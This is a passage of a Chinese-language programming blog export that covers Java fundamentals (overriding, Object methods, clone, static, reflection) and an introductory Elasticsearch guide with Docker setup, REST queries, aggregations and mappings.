super.func(); System.out.println(\"SuperExtendExample.func()\"); &#125;&#125; 12SuperExample e = new SuperExtendExample(1, 2, 3);e.func(); 12SuperExample.func()SuperExtendExample.func() Using the Keyword super 0x4.4重写与重载1. 重写（Override） 存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。 为了满足里式替换原则，重写有以下三个限制： 子类方法的访问权限必须大于等于父类方法； 子类方法的返回类型必须是父类方法返回类型或为其子类型。 子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。 使用 @Override 注解，可以让编译器帮忙检查是否满足上面的三个限制条件。 下面的示例中，SubClass 为 SuperClass 的子类，SubClass 重写了 SuperClass 的 func() 方法。其中： 子类方法访问权限为 public，大于父类的 protected。 子类的返回类型为 ArrayList，是父类返回类型 List 的子类。 子类抛出的异常类型为 Exception，是父类抛出异常 Throwable 的子类。 子类重写方法使用 @Override 注解，从而让编译器自动检查是否满足限制条件。 123456789101112class SuperClass &#123; protected List&lt;Integer&gt; func() throws Throwable &#123; return new ArrayList&lt;&gt;(); &#125;&#125;class SubClass extends SuperClass &#123; @Override public ArrayList&lt;Integer&gt; func() throws Exception &#123; return new ArrayList&lt;&gt;(); &#125;&#125; 在调用一个方法时，先从本类中查找看是否有对应的方法，如果没有查找到再到父类中查看，看是否有继承来的方法。否则就要对参数进行转型，转成父类之后看是否有对应的方法。总的来说，方法调用的优先级为： this.func(this) super.func(this) this.func(super) super.func(super) 12345678910111213141516171819202122232425262728293031323334/* A | B | C | D */class A &#123; public void show(A obj) &#123; System.out.println(\"A.show(A)\"); &#125; public void show(C obj) &#123; System.out.println(\"A.show(C)\"); &#125;&#125;class B extends A&#123; @Override public void show(A obj) &#123; System.out.println(\"B.show(A)\"); &#125;&#125;class C extends B &#123;&#125;class D extends C &#123;&#125; 123456789101112131415161718192021public static void main(String[] args) &#123; A a = new A(); B b = new B(); C c = new C(); D d = new D(); // 在 A 中存在 show(A obj)，直接调用 a.show(a); // A.show(A) // 在 A 中不存在 show(B obj)，将 B 转型成其父类 A a.show(b); // A.show(A) // 在 B 中存在从 A 继承来的 show(C obj)，直接调用 b.show(c); // A.show(C) // 在 B 中不存在 show(D obj)，但是存在从 A 继承来的 show(C obj)，将 D 转型成其父类 C b.show(d); // A.show(C) // 引用的还是 B 对象，所以 ba 和 b 的调用结果一样 A ba = new B(); ba.show(c); // A.show(C) ba.show(d); // A.show(C)&#125; 2. 重载（Overload） 存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。 应该注意的是，返回值不同，其它都相同不算是重载。 0x5Object 通用方法0x5.1概览12345678910111213141516171819202122public native int hashCode()public boolean equals(Object obj)protected native Object clone() throws CloneNotSupportedExceptionpublic String toString()public final native Class&lt;?&gt; getClass()protected void finalize() throws Throwable &#123;&#125;public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedException 0x5.2equals()1. 等价关系 Ⅰ 自反性 1x.equals(x); // true Ⅱ 对称性 1x.equals(y) == y.equals(x); // true Ⅲ 传递性 12if (x.equals(y) &amp;&amp; y.equals(z)) x.equals(z); // true; Ⅳ 一致性 多次调用 equals() 方法结果不变 1x.equals(y) == x.equals(y); // true Ⅴ 与 null 的比较 对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false 1x.equals(null); // false; 2. 等价与相等 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。 1234Integer x = new Integer(1);Integer y = new Integer(1);System.out.println(x.equals(y)); // trueSystem.out.println(x == y); // false 3. 实现 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 对象进行转型； 判断每个关键域是否相等。 123456789101112131415161718192021222324public class EqualExample &#123; private int x; private int y; private int z; public EqualExample(int x, int y, int z) &#123; this.x = x; this.y = y; this.z = z; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; &#125;&#125; 0x5.3hashCode()hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。 在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。 下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象，但是因为 EqualExample 没有实现 hashCode() 方法，因此这两个对象的散列值是不同的，最终导致集合添加了两个等价的对象。 1234567EqualExample e1 = new EqualExample(1, 1, 1);EqualExample e2 = new EqualExample(1, 1, 1);System.out.println(e1.equals(e2)); // trueHashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();set.add(e1);set.add(e2);System.out.println(set.size()); // 2 理想的散列函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。 一个数与 31 相乘可以转换成移位和减法：31*x == (x&lt;&lt;5)-x，编译器会自动进行这个优化。 12345678@Overridepublic int hashCode() &#123; int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;&#125; 0x5.4toString()默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。 12345678public class ToStringExample &#123; private int number; public ToStringExample(int number) &#123; this.number = number; &#125;&#125; 12ToStringExample example = new ToStringExample(123);System.out.println(example.toString()); 1ToStringExample@4554617c 0x5.5clone()1. cloneable clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。 1234public class CloneExample &#123; private int a; private int b;&#125; 12CloneExample e1 = new CloneExample();// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object' 重写 clone() 得到以下实现： 123456789public class CloneExample &#123; private int a; private int b; @Override public CloneExample clone() throws CloneNotSupportedException &#123; return (CloneExample)super.clone(); &#125;&#125; 123456CloneExample e1 = new CloneExample();try &#123; CloneExample e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125; 1java.lang.CloneNotSupportedException: CloneExample 以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。 应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。 123456789public class CloneExample implements Cloneable &#123; private int a; private int b; @Override public Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125;&#125; 2. 浅拷贝 拷贝对象和原始对象的引用类型引用同一个对象。 123456789101112131415161718192021222324public class ShallowCloneExample implements Cloneable &#123; private int[] arr; public ShallowCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected ShallowCloneExample clone() throws CloneNotSupportedException &#123; return (ShallowCloneExample) super.clone(); &#125;&#125; 123456789ShallowCloneExample e1 = new ShallowCloneExample();ShallowCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 222 3. 深拷贝 拷贝对象和原始对象的引用类型引用不同对象。 1234567891011121314151617181920212223242526272829public class DeepCloneExample implements Cloneable &#123; private int[] arr; public DeepCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected DeepCloneExample clone() throws CloneNotSupportedException &#123; DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i &lt; arr.length; i++) &#123; result.arr[i] = arr[i]; &#125; return result; &#125;&#125; 123456789DeepCloneExample e1 = new DeepCloneExample();DeepCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 2 4. clone() 的替代方案 使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。 1234567891011121314151617181920212223242526public class CloneConstructorExample &#123; private int[] arr; public CloneConstructorExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public CloneConstructorExample(CloneConstructorExample original) &#123; arr = new int[original.arr.length]; for (int i = 0; i &lt; original.arr.length; i++) &#123; arr[i] = original.arr[i]; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125;&#125; 1234CloneConstructorExample e1 = new CloneConstructorExample();CloneConstructorExample e2 = new CloneConstructorExample(e1);e1.set(2, 222);System.out.println(e2.get(2)); // 2 0x6关键字0x6.1final1. 数据 声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。 1234final int x = 1;// x = 2; // cannot assign value to final variable 'x'final A y = new A();y.a = 1; 2. 方法 声明方法不能被子类重写。 private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。 3. 类 声明类不允许被继承。 0x6.1static1. 静态变量 静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。 123456789101112public class A &#123; private int x; // 实例变量 private static int y; // 静态变量 public static void main(String[] args) &#123; // int x = A.x; // Non-static field 'x' cannot be referenced from a static context A a = new A(); int x = a.x; int y = A.y; &#125;&#125; 2. 静态方法 静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。 12345public abstract class A &#123; public static void func1()&#123; &#125; // public abstract static void func2(); // Illegal combination of modifiers: 'abstract' and 'static'&#125; 只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字。 1234567891011public class A &#123; private static int x; private int y; public static void func1()&#123; int a = x; // int b = y; // Non-static field 'y' cannot be referenced from a static context // int b = this.y; // 'A.this' cannot be referenced from a static context &#125;&#125; 3. 静态语句块 静态语句块在类初始化时运行一次。 12345678910public class A &#123; static &#123; System.out.println(\"123\"); &#125; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new A(); &#125;&#125; 1123 4. 静态内部类 非静态内部类依赖于外部类的实例，而静态内部类不需要。 123456789101112131415public class OuterClass &#123; class InnerClass &#123; &#125; static class StaticInnerClass &#123; &#125; public static void main(String[] args) &#123; // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); &#125;&#125; 静态内部类不能访问外部类的非静态的变量和方法。 5. 静态导包 在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。 1import static com.xxx.ClassName.* 6. 初始化顺序 静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。 1public static String staticField = \"静态变量\"; 123static &#123; System.out.println(\"静态语句块\");&#125; 1public String field = \"实例变量\"; 123&#123; System.out.println(\"普通语句块\");&#125; 最后才是构造函数的初始化。 123public InitialOrderTest() &#123; System.out.println(\"构造函数\");&#125; 存在继承的情况下，初始化顺序为： 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数） 0x7反射每个类都有一个 Class 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。 类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 Class.forName(&quot;com.mysql.jdbc.Driver&quot;) 这种方式来控制类的加载，该方法会返回一个 Class 对象。 反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。 Class 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类： Field ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段； Method ：可以使用 invoke() 方法调用与 Method 对象关联的方法； Constructor ：可以用 Constructor 创建新的对象。 反射的优点： 可扩展性 ：应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。 类浏览器和可视化开发环境 ：一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。 调试器和测试工具 ： 调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。 反射的缺点： 尽管反射非常强大，但也不能滥用。如果一个功能可以不用反射完成，那么最好就不用。在我们使用反射技术时，下面几条内容应该牢记于心。 性能开销 ：反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。 安全限制 ：使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet，那么这就是个问题了。 内部暴露 ：由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。 Trail: The Reflection API 深入解析 Java 反射（1）- 基础 0x8异常Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种： 受检异常 ：需要用 try…catch… 语句捕获并进行处理，并且可以从异常中恢复； 非受检异常 ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。 Java 入门之异常处理 Java 异常的面试问题及答案 -Part 1 0x9泛型123456public class Box&lt;T&gt; &#123; // T stands for \"Type\" private T t; public void set(T t) &#123; this.t = t; &#125; public T get() &#123; return t; &#125;&#125; Java 泛型详解 10 道 Java 泛型面试题 0x10注解Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。 注解 Annotation 实现原理与自定义注解例子 0x11特性0x11.1Java 各版本的新特性New highlights in Java SE 8 Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed New highlights in Java SE 7 Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax Difference between Java 1.8 and Java 1.7? Java 8 特性 0x11.2Java 与 C++ 的区别 Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。 Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。 Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。 Java 支持自动垃圾回收，而 C++ 需要手动回收。 Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。 Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。 Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。 Java 不支持条件编译，C++ 通过 #ifdef #ifndef 等预处理命令从而实现条件编译。 What are the main differences between Java and C++? 0x11.3JRE or JDK JRE is the JVM program, Java application need to run on JRE. JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler “javac” 参考资料 Eckel B. Java 编程思想[M]. 机械工业出版社, 2002. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"java基础","slug":"java基础","permalink":"https://blog.cfyqy.com/tags/java%E5%9F%BA%E7%A1%80/"}],"author":"ye1s"},{"title":"elasticsearch总结","slug":"asticsearch总结","date":"2019-06-08T12:53:00.000Z","updated":"2020-04-13T08:11:33.955Z","comments":true,"path":"article/664b37a4.html","link":"","permalink":"https://blog.cfyqy.com/article/664b37a4.html","excerpt":"Elasticsearch是一个基于Apache Lucene(TM)的开源搜索引擎。无论在开源还是专有领域，Lucene可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库。但是，Lucene只是一个库。想要使用它，你必须使用Java来作为开发语言并将其直接集成到你的应用中，更糟糕的是，Lucene非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。","text":"Elasticsearch是一个基于Apache Lucene(TM)的开源搜索引擎。无论在开源还是专有领域，Lucene可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库。但是，Lucene只是一个库。想要使用它，你必须使用Java来作为开发语言并将其直接集成到你的应用中，更糟糕的是，Lucene非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。 详情看此文:http://wiki.jikexueyuan.com/project/elasticsearch-definitive-guide-cn/ 0x1elasticsearch安装到官网下载:https://www.elastic.co/cn/products/elasticsearchik分词器下载:https://github.com/medcl/elasticsearch-analysis-ik/releases 0x1.1镜像拉取 1docker pull elasticsearch:tag 0x1.2调高JVM线程数限制数量（不然启动容器的时候会报错，亲身试验） 12345vim /etc/sysctl.conf# 添加这个vm.max_map_count=262144 # 保存后执行这个命令sysctl -p 0x1.3运行容器ElasticSearch的默认端口是9200，我们把宿主环境9200端口映射到Docker容器中的9200端口，就可以访问到Docker容器中的ElasticSearch服务了，同时我们把这个容器命名为es。 1docker run -it -e \"discovery.type=single-node\" --name=\"es\" -p 62100:9200 -p 63100:9300 elasticsearch:tag /bin/bash 0x1.4elasticsearch启动以普通用户启动https://blog.csdn.net/lahand/article/details/78954112具体搭建以后再探讨docker部署https://juejin.im/post/5ca0d12c518825550b35be6dhttps://blog.csdn.net/u014526891/article/details/82822647 0x2 elasticsearch简介0x2.1Elasticsearch概念Elasticsearch也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。 不过，Elasticsearch不仅仅是Lucene和全文搜索，我们还能这样去描述它： 分布式的实时文件存储，每个字段都被索引并可被搜索 分布式的实时分析搜索引擎 可以扩展到上百台服务器，处理PB级结构化或非结构化数据 0x2.2集群和节点节点(node)是一个运行着的Elasticsearch实例。集群(cluster)是一组具有相同cluster.name的节点集合，他们协同工作，共享数据并提供故障转移和扩展功能，当然一个节点也可以组成一个集群。 你最好找一个合适的名字来替代cluster.name的默认值，比如你自己的名字，这样可以防止一个新启动的节点加入到相同网络中的另一个同名的集群中。 你可以通过修改config/目录下的elasticsearch.yml文件，然后重启ELasticsearch来做到这一点。 0x2.3Java API与Elasticsearch交互如何与Elasticsearch交互取决于你是否使用Java。 Elasticsearch为Java用户提供了两种内置客户端： 节点客户端(node client)：节点客户端以无数据节点(none data node)身份加入集群，换言之，它自己不存储任何数据，但是它知道数据在集群中的具体位置，并且能够直接转发请求到对应的节点上。 传输客户端(Transport client)：这个更轻量的传输客户端能够发送请求到远程集群。它自己不加入集群，只是简单转发请求给集群中的节点。 两个Java客户端都通过9300端口与集群交互，使用Elasticsearch传输协议(Elasticsearch Transport Protocol)。集群中的节点之间也通过9300端口进行通信。如果此端口未开放，你的节点将不能组成集群。 TIP Java客户端所在的Elasticsearch版本必须与集群中其他节点一致，否则，它们可能互相无法识别。 0x2.4基于HTTP协议，以JSON为数据交互格式的RESTful API其他所有程序语言都可以使用RESTful API，通过9200端口的与Elasticsearch进行通信，你可以使用你喜欢的WEB客户端，事实上，如你所见，你甚至可以通过curl命令与Elasticsearch通信。 NOTEElasticsearch官方提供了多种程序语言的客户端——Groovy，Javascript， .NET，PHP，Perl，Python，以及 Ruby——还有很多由社区提供的客户端和插件，所有这些可以在文档中找到。 向Elasticsearch发出的请求的组成部分与其它普通的HTTP请求是一样的： 1curl -X&lt;VERB&gt; '&lt;PROTOCOL&gt;://&lt;HOST&gt;:&lt;PORT&gt;/&lt;PATH&gt;?&lt;QUERY_STRING&gt;' -d '&lt;BODY&gt;' VERB HTTP方法：GET, POST, PUT, HEAD, DELETEPROTOCOL http或者https协议（只有在Elasticsearch前面有https代理的时候可用）HOST Elasticsearch集群中的任何一个节点的主机名，如果是在本地的节点，那么就叫localhostPORT Elasticsearch HTTP服务所在的端口，默认为9200PATH API路径（例如_count将返回集群中文档的数量），PATH可以包含多个组件，例如_cluster/stats或者_nodes/stats/jvmQUERY_STRING 一些可选的查询请求参数，例如?pretty参数将使请求返回更加美观易读的JSON数据BODY 一个JSON格式的请求主体（如果请求需要的话）举例说明，为了计算集群中的文档数量，我们可以这样做： 1234567curl -XGET 'http://localhost:9200/_count?pretty' -d '&#123; \"query\": &#123; \"match_all\": &#123;&#125; &#125;&#125;' Elasticsearch返回一个类似200 OK的HTTP状态码和JSON格式的响应主体（除了HEAD请求）。上面的请求会得到如下的JSON格式的响应主体： 12345678&#123; \"count\" : 0, \"_shards\" : &#123; \"total\" : 5, \"successful\" : 5, \"failed\" : 0 &#125;&#125; 0x2.5面向文档Elasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。这种理解数据的方式与以往完全不同，这也是Elasticsearch能够执行复杂的全文搜索的原因之一。 JSONELasticsearch使用Javascript对象符号(JavaScript Object Notation)，也就是JSON，作为文档序列化格式。JSON现在已经被大多语言所支持，而且已经成为NoSQL领域的标准格式。它简洁、简单且容易阅读。 0x2.6索引在Elasticsearch中，文档归属于一种类型(type),而这些类型存在于索引(index)中，我们可以画一些简单的对比图来类比传统关系型数据库： 12Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; ColumnsElasticsearch -&gt; Indices -&gt; Types -&gt; Documents -&gt; Fields Elasticsearch集群可以包含多个索引(indices)（数据库），每一个索引可以包含多个类型(types)（表），每一个类型包含多个文档(documents)（行），然后每个文档包含多个字段(Fields)（列）。 「索引」含义的区分你可能已经注意到索引(index)这个词在Elasticsearch中有着不同的含义，所以有必要在此做一下区分:索引（名词） 如上文所述，一个索引(index)就像是传统关系数据库中的数据库，它是相关文档存储的地方，index的复数是indices 或indexes。索引（动词） 「索引一个文档」表示把一个文档存储到索引（名词）里，以便它可以被检索或者查询。这很像SQL中的INSERT关键字，差别是，如果文档已经存在，新的文档将覆盖旧的文档。倒排索引 传统数据库为特定列增加一个索引，例如B-Tree索引来加速检索。Elasticsearch和Lucene使用一种叫做倒排索引(inverted index)的数据结构来达到相同目的。 0x2.7使用DSL语句查询查询字符串搜索便于通过命令行完成特定(ad hoc)的搜索，但是它也有局限性（参阅简单搜索章节）。Elasticsearch提供丰富且灵活的查询语言叫做DSL查询(Query DSL),它允许你构建更加复杂、强大的查询。 DSL(Domain Specific Language特定领域语言)以JSON请求体的形式出现。我们可以这样表示之前关于“Smith”的查询: 12345678GET /megacorp/employee/_search&#123; \"query\" : &#123; \"match\" : &#123; \"last_name\" : \"Smith\" &#125; &#125;&#125; 0x2.8聚合最后，我们还有一个需求需要完成：允许管理者在职员目录中进行一些分析。 Elasticsearch有一个功能叫做聚合(aggregations)，它允许你在数据上生成复杂的分析统计。它很像SQL中的GROUP BY但是功能更强大。 举个例子，让我们找到所有职员中最大的共同点（兴趣爱好）是什么： 12345678GET /megacorp/employee/_search&#123; \"aggs\": &#123; \"all_interests\": &#123; \"terms\": &#123; \"field\": \"interests\" &#125; &#125; &#125;&#125; 暂时先忽略语法只看查询结果： 12345678910111213141516171819202122&#123; ... \"hits\": &#123; ... &#125;, \"aggregations\": &#123; \"all_interests\": &#123; \"buckets\": [ &#123; \"key\": \"music\", \"doc_count\": 2 &#125;, &#123; \"key\": \"forestry\", \"doc_count\": 1 &#125;, &#123; \"key\": \"sports\", \"doc_count\": 1 &#125; ] &#125; &#125;&#125; 如果我们想知道所有姓”Smith”的人最大的共同点（兴趣爱好），我们只需要增加合适的语句既可： 123456789101112131415GET /megacorp/employee/_search&#123; \"query\": &#123; \"match\": &#123; \"last_name\": \"smith\" &#125; &#125;, \"aggs\": &#123; \"all_interests\": &#123; \"terms\": &#123; \"field\": \"interests\" &#125; &#125; &#125;&#125; all_interests聚合已经变成只包含和查询语句相匹配的文档了： 12345678910111213...\"all_interests\": &#123; \"buckets\": [ &#123; \"key\": \"music\", \"doc_count\": 2 &#125;, &#123; \"key\": \"sports\", \"doc_count\": 1 &#125; ]&#125; 聚合也允许分级汇总。例如，让我们统计每种兴趣下职员的平均年龄： 12345678910111213GET /megacorp/employee/_search&#123; \"aggs\" : &#123; \"all_interests\" : &#123; \"terms\" : &#123; \"field\" : \"interests\" &#125;, \"aggs\" : &#123; \"avg_age\" : &#123; \"avg\" : &#123; \"field\" : \"age\" &#125; &#125; &#125; &#125; &#125;&#125; 虽然这次返回的聚合结果有些复杂，但任然很容易理解： 1234567891011121314151617181920212223242526...\"all_interests\": &#123; \"buckets\": [ &#123; \"key\": \"music\", \"doc_count\": 2, \"avg_age\": &#123; \"value\": 28.5 &#125; &#125;, &#123; \"key\": \"forestry\", \"doc_count\": 1, \"avg_age\": &#123; \"value\": 35 &#125; &#125;, &#123; \"key\": \"sports\", \"doc_count\": 1, \"avg_age\": &#123; \"value\": 25 &#125; &#125; ]&#125; 该聚合结果比之前的聚合结果要更加丰富。我们依然得到了兴趣以及数量（指具有该兴趣的员工人数）的列表，但是现在每个兴趣额外拥有avg_age字段来显示具有该兴趣员工的平均年龄。 0x2.9分布式系统Elasticsearch致力于隐藏分布式系统的复杂性。以下这些操作都是在底层自动完成的： 将你的文档分区到不同的容器或者分片(shards)中，它们可以存在于一个或多个节点中。 将分片均匀的分配到各个节点，对索引和搜索做负载均衡。 冗余每一个分片，防止硬件故障造成的数据丢失。 将集群中任意一个节点上的请求路由到相应数据所在的节点。 无论是增加节点，还是移除节点，分片都可以做到无缝的扩展和迁移。 0x3 分布式集群0x3.1空集群如果我们启动一个单独的节点，它还没有数据和索引一个节点(node)就是一个Elasticsearch实例，而一个集群(cluster)由一个或多个节点组成，它们具有相同的cluster.name，它们协同工作，分享数据和负载。当加入新的节点或者删除一个节点时，集群就会感知到并平衡数据。 集群中一个节点会被选举为主节点(master),它将临时管理集群级别的一些变更，例如新建或删除索引、增加或移除节点等。主节点不参与文档级别的变更或搜索，这意味着在流量增长的时候，该主节点不会成为集群的瓶颈。任何节点都可以成为主节点。我们例子中的集群只有一个节点，所以它会充当主节点的角色。 做为用户，我们能够与集群中的任何节点通信，包括主节点。每一个节点都知道文档存在于哪个节点上，它们可以转发请求到相应的节点上。我们访问的节点负责收集各节点返回的数据，最后一起返回给客户端。这一切都由Elasticsearch处理。 0x3.2集群健康 在Elasticsearch集群中可以监控统计很多信息，但是只有一个是最重要的：集群健康(cluster health)。集群健康有三种状态：green、yellow或red。 1GET /_cluster/health 在一个没有索引的空集群中运行如上查询，将返回这些信息： 123456789101112&#123; \"cluster_name\": \"elasticsearch\", \"status\": \"green\", &lt;1&gt; \"timed_out\": false, \"number_of_nodes\": 1, \"number_of_data_nodes\": 1, \"active_primary_shards\": 0, \"active_shards\": 0, \"relocating_shards\": 0, \"initializing_shards\": 0, \"unassigned_shards\": 0&#125; status 是我们最感兴趣的字段status字段提供一个综合的指标来表示集群的的服务状况。三种颜色各自的含义： 颜色 意义 green 所有主要分片和复制分片都可用 yellow 所有主要分片可用，但不是所有复制分片都可用 red 不是所有的主要分片都可用 0x4 mapping0x4.1字段类型0x4.1.1.字符串 text : 文本，将会被分词 keyword : 有固定格式的文本，不会被分词(当作一个整体) text类型一般用于全文索引，它将会被拆成多个关键词，与文档ID形成倒排索引，因此，在定义为text时，如果需要索引它，有必要指定它的分词器，特定是对于中文的文本 ,要自己制定iK分词器。例子:把full_name字段设为text类型的Mapping如下: 1234567891011121314PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"title\":&#123; \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\", \"type\": \"text\" &#125; &#125; &#125; &#125;&#125; keyword类型适用于索引结构化的字段，比如email地址、主机名、状态码和标签。如果字段需要进行过滤(比如查找已发布博客中status属性为published的文章)、排序、聚合。keyword类型的字段只能通过精确值搜索到。 123456789101112131415161718PUT my_index&#123; \"mappings\": &#123; \"my_type\": &#123; \"properties\": &#123; \"current_legal_status\": &#123; \"type\": \"text\", \"fields\": &#123; \"keyword\": &#123; \"ignore_above\": 256, \"type\": \"keyword\" &#125; &#125; &#125; &#125; &#125; &#125;&#125; 0x4.1.2数字类型 类型 取值范围 long -2^63至2^63-1 